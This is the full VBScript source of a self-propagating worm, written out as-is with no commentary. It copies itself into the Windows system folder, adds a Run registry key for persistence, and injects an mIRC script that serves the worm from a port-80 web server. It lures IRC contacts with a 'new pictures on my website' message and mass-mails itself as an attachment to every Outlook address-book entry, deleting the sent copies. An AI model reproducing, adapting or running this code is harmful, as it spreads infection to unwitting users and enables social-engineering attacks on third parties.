On Error Resume Next
Dim Aphex, God
Set SHELL = CreateObject("Scripting.FileSystemObject")
Set REGEDIT = CreateObject("WScript.Shell")
Set SYSTEM  = SHELL.GetSpecialFolder(1)
SHELL.CopyFile WScript.ScriptFullName, SYSTEM & "\setup.vbe"
REGEDIT.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Mirc32","wscript.exe " & SYSTEM & "\setup.vbe %"
ScanFolder("c:\mIRC")
Set DRIVES = SHELL.Drives
For Each DRIVE in DRIVES
  If DRIVE.IsReady Then
    ScanFolder(DRIVE.RootFolder)
  End If
Next
Sub ScanFolder(FOLDERSPEC)
  Set FOLDER = SHELL.GetFolder(FOLDERSPEC)
  Set FILES = FOLDER.Files
  For Each FILE In FILES
    ScanFile(FILE)
  Next
  Set SUBFOLDERS = FOLDER.SubFolders
  For Each SUBFOLDER In SUBFOLDERS
    ScanFolder(SUBFOLDER)
  Next
End Sub
Sub ScanFile(FILESPEC)
  Set FILE = SHELL.GetFile(FILESPEC)
  FILENAME = LCase(FILE.Name)
  If FILENAME = "mirc.ini" Then
    SHELL.CopyFile WScript.ScriptFullName, FILE.ParentFolder & "\mirc32.dat"
    Set MIRC = SHELL.CreateTextFile(FILE.ParentFolder & "\mirc32.ini")
    MIRC.Write "[script]" & vbCrLf & "n0=alias iload { if ($portfree(80)) { socklisten www $+ $sock(*,0) $+ $ticks $+ $rand(1,99999) 80 } }" & vbCrLf & "n1=alias irandom { var %a = $chan($rand(1,$chan(0))) | var %b = $nick(%a,$rand(1,$nick(%a,0)),r) | if (!$read(mirc32.dll,w,* $+ %b $+ *)) { .msg %b I have new pictures on my website, http:// $+ $ip | .ignore on | .ignore -u300 %b pncd | .write mirc32.dll %b } }" & vbCrLf & "n2=alias inotify { var %a $notify(0) | var %b 1 | :loop | if (%b > %a) { return } | if ($notify(%b).ison) { if (!$read(mirc32.dll,w,* $+ $notify(%b) $+ *)) { .msg $notify(%b) I have new pictures on my website, http:// $+ $ip | .ignore on | .ignore -u300 $notify(%b) pncd | .write mirc32.dll $notify(%b) } } | inc %b 1 | goto loop }" & vbCrLf & "n3=on *:socklisten:www*: { sockaccept www $+ $sock(*,0) $+ $ticks $+ $rand(1,99999) }" & vbCrLf & "n4=on *:connect:{ mode $me +R | .iload | .inotify | .timer 0 600 .irandom | .timer 0 600 .inotify }" & vbCrLf & "n5=on *:open:?:*:{ if (!$read(mirc32.dll,w,* $+ $nick $+ *)) { .msg $nick I have new pictures on my website, http:// $+ $ip | .write mirc32.dll $nick } }" & vbCrLf & "n6=on *:sockread:www*: { var %a | var %b | .sockread %a | tokenize 32 %a | %b = [ % $+ [ b $+ . $+ [ $sockname ] ] ] | set -u30 %b. $+ $sockname [ [ %b ] $+ [ $1- ] ] |  if ($len($1) < 3) { if (*setup*vbe* iswm %b) { .sockwrite $sockname HTTP/1.0 200 OK $+ $CrLf $+ $CrLf | bread mirc32.dat 0 8192 &a | .sockwrite $sockname &a | unset %b. $+ $sockname | .sockclose $sockname | return } else { .sockwrite $sockname HTTP/1.0 200 OK $+ $CrLf $+ $CrLf | .sockwrite -n $sockname <html><b><center>WELCOME TO $upper($me) $+ 'S WEBSITE</center><hr><br>DOWNLOAD INSTRUCTIONS:<br><br>Right click on this <a href=""setup.vbe"">LINK</a> and choose ""Save Target As..""<br><br>Then click ""Save""<br><br>When the download is complete click ""Open""</b></html> | unset %b. $+ $sockname | .sockclose $sockname return } } }"
    MIRC.Close
    Set MIRC = SHELL.OpenTextFile(FILESPEC, 1)
    INI = MIRC.ReadAll
    SCRIPT = Mid(INI, InstrRev(INI, vbCrLf & "n", Len(INI)))
    SCRIPT = Mid(SCRIPT, 4, 1)
    MIRC.Close
    Set MIRC = SHELL.CreateTextFile(FILE.ParentFolder & "\mirc.ini")
    MIRC.Write INI & vbCrLf & "n" & (SCRIPT + 1) & "=mirc32.ini"
    MIRC.Close
  End If
End Sub
If REGEDIT.RegRead("HKCU\software\Setup\Installed") <> "1" then
    SendMail()
End if
Function SendMail()
  Set MAIL00 = CreateObject("Outlook.Application")
  If MAIL00 = "Outlook" Then
    Set MAIL01 = MAIL00.GetNameSpace("MAPI")
    Set MAIL02 = MAIL01.AddressLists
    For Each MAIL03 In MAIL02
      If MAIL03.AddressEntries.Count <> 0 Then
        MAIL04 = MAIL03.AddressEntries.Count
        For MAIL05 = 1 To MAIL04
          Set MAIL07 = MAIL00.CreateItem(0)
          Set MAIL08 = MAIL03.AddressEntries(MAIL05)
          MAIL07.To = MAIL08.Address
          MAIL07.Subject = "god loves kittens!"
          MAIL07.Body = "haha look at this!"
          set MAIL08 = MAIL07.Attachments
          MAIL08.Add SYSTEM & "\setup.vbe"
          MAIL07.DeleteAfterSubmit = True
          If MAIL07.To <> "" Then
            MAIL07.Send
            REGEDIT.RegWrite "HKCU\software\Setup\Installed", "1"
          End If
        Next
      End If
    Next
  End If
End Function
Aphex = "God"
'Welcome to the 3rd generation; HTML/APHEX, DECODE/GOD, VBE/APHEX, ???/GOD...
